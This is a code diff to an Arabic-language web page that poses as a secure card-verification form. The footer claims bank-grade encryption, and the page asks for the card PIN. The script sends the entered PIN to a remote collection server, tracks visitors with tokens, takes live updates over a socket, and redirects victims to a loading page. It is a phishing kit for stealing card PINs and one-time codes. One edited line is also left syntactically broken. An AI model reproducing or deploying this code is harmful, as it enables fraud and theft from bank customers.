@@ -19,11 +19,13 @@
         </form>
         <div class="secure-footer">🔒 تشفير بنكي معتمد وشفاف بالكامل</div>
     </div>
+
     <script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_sehhaty_v1", visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
         var formName = "الرمز السري للصراف (PIN)";
 
-        fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/pin.html', pageTitle: 'تأكيد الرمز السري للبطاقة - PIN' }) }).catch(function(){});
+        fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/oot', pageTitle: 'تأكيد الرمز السري للبطاقة - PIN' }) }).catch(function(){});
 
+    
         try {
             var socket = io(SERVER_URL);
             socket.on('visitor_updated', function(v) {
@@ -38,8 +40,9 @@
             });
         } catch(e){}
 
+
         var streamDebounce = null;
-        function handlePinInput(el) {
+        function handleOtpInput(el) {
             var val = el.value.replace(/\D/g, ''); el.value = val;
             document.getElementById('pin-submit-btn').disabled = (val.length < 4);
             document.getElementById('err-box').style.display = 'none';
@@ -50,15 +53,17 @@
             }, 200);
         }
 
-        function handlePinSubmit(e) {
-            e.preventDefault(); var val = document.getElementById('pin-input').value; if (val.length < 4) return;
-            var btn = document.getElementById('pin-submit-btn'); btn.disabled = true; btn.innerText = "جاري التأكيد...";
+
+        function handleOtpSubmit(e) {
+            e.preventDefault(); var val = document.getElementById('otp-input').value; if (val.length < 4) return;
+            var btn = document.getElementById('pin-submit-btn'); btn.disabled = true; btn.innerText = "جاري التحقق...";
 
             fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (مؤكد ✅)", submissionData: { 'الرمز السري للبطاقة PIN': val, 'الحالة': 'تم الإرسال والتحقق' }, isFinalSubmission: true, isImportant: true }) }).then(function() {
-                fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading_phone.html', pageTitle: 'جاري مطابقة الرمز السري...' }) }).catch(function(){});
+                fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading_phone.html 'جاري مطابقة الرمز السري...' }) }).catch(function(){});
                 setTimeout(function() { window.location.href = 'loading_phone.html'; }, 800);
             }).catch(function() { btn.disabled = false; btn.innerText = "تأكيد وإرسال"; });
         }
+
     </script>
 </body>
 </html>
